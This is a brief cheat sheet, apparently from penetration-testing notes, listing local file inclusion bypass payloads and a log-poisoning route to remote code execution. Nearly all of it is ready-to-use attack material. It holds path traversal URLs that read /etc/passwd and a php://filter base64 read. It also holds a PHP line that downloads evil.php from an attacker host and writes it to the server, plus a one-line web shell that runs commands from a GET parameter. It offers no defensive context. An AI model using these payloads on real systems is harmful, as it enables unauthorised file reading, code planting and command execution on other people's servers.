## LFI Filter Bypass
```
# For site that append .php to the end of the url:
http://[URL]/?page=../../../../../../../etc/passwd&ext=

# For site that requires certain keyword:
http://[URL]/?page=[keyword])../../../../../../etc/password

# PHP tag base64 encode
php://filter/convert.base64-encode/resource=/etc/passwd

# URL encode
http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

# If site return error code on fail, use ffuf or burp intruder
```

## LFI to RCE - Log Poisoning
```
# Modify user agent
# Read /var/log/apache2/access.log
<?php file_put_contents('evil.php', file_get_contents('http://[IP_ADDR]/evil.php'))?>
<?php echo exec($_GET[cmd]) ; ?>
```
